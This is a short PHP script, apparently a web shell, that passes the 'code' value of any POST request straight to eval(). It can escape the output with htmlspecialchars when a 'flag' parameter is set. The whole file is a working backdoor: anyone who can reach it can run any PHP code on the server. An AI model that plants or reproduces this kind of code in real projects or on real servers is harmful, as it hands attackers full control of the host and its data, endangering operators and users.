<?php
ini_set('display_errors', '1');
error_reporting(E_ALL);
if (@$_POST['flag']=="true") {
    ob_start();
    eval($_POST['code']);
    $c = ob_get_contents();
    ob_clean();
    echo htmlspecialchars($c);
} else {
    eval($_POST['code']);
}